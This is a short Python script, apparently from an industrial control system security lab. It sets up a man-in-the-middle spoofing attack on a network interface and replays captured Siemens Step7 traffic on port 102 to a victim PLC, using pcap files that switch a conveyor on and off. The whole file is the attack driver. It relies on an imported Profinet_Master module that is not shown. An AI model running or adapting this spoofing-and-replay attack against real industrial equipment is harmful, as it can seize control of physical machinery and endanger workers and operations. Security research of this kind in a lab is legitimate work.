from Profinet_Master import *

if __name__ == '__main__':
    profinet_port = 102
    mitm = MITM_conf(interface='eno1', pkt_count="100", port=str(102))
    mitm.init_spoofing()
    victim = mitm.victim
    client = Step7_Master_Replay(victim, profinet_port, "./pcap/Test 1 - Full Conveyor On Off (src).pcap")            #OLD
    #client = Step7_Master_Replay(victim, profinet_port,"./pcap/Test 3 - Direct Full Conveyor On Off (src).pcap")
    #client = Step7_Master_Replay(victim, profinet_port, "./pcap/Test 2.pcap")
    client.start()